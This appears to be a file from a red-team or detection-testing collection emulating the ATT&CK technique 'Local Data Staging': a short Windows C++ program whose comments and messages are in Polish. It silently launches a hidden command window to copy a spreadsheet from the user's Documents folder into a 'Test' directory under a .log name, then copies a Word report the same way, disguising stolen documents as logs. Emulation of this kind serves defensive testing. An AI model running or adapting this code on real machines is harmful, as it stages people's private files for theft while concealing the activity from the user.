@@ -1,0 +1,66 @@
+---
+title: "T1074.001.Local Data Staging"
+folder: "11. Collection"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <filesystem>
+
+void AutorunRegistryBackground4() {
+
+    const char* command = "cmd /c copy C:\\Users\\User\\Documents\\WażneDaneTabelaryczne.xlsx Test\\Test1.log";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    if (!std::filesystem::exists("Test")) {
+        if (!std::filesystem::create_directories("Test")) {
+        }
+    }
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+bool Copy1File() {
+    std::ifstream src("C:\\Users\\User\\Documents\\Raport o stanie projektu.docx", std::ios::binary);
+    std::string destPath = "Test\\Test2API.log";
+
+    if (!std::filesystem::exists("Test")) {
+        if (!std::filesystem::create_directories("Test")) {
+        }
+    }
+
+    std::ofstream dest(destPath, std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    AutorunRegistryBackground4();
+    Copy1File();
+    return 0;
+}
